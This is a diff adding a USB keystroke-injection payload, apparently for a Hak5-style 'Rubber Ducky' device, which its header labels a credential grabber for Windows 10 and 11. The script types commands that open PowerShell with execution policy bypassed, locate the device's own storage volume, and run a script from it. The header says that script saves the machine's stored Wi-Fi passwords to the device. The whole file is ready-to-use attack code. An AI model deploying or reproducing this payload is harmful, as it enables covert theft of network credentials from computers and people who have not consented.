@@ -1,0 +1,40 @@
+REM Title:         Local_WLAN_Borrower
+REM Description:   Borrows wifi passwords and saves them on the DUCKY
+REM Author:        YEETBOY0330
+REM Props:         Zero_Sploit(DUCKY-WIFI-GRABBER) + Hak5 Team
+REM Version:       1.0
+REM Category:      Creds
+REM Target:        Windows 10 & 11
+REM Attackmodes:   HID, STORAGE
+
+ATTACKMODE HID STORAGE
+DEFAULTDELAY 20
+
+REM Initial Delay to make sure the system is ready
+DELAY 1000
+
+REM Open PowerShell with script execution enabled
+GUI r
+DELAY 700
+STRING powershell -ExecutionPolicy Bypass
+DELAY 1000
+ENTER
+
+REM Get USB drive letter and change to the drive (assuming drive label is DUCKY)
+DELAY 500
+STRING $targetLabel = "DUCKY"
+ENTER
+DELAY 500
+STRING $volume = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }
+ENTER
+DELAY 500
+STRING $driveLetter = $volume.DriveLetter + ":"
+ENTER
+DELAY 500
+STRING cd $driveLetter
+ENTER
+
+REM Execute PowerShell script (ensure 1.ps1 exists on the USB drive)
+DELAY 500
+STRING .\1.ps1
+ENTER
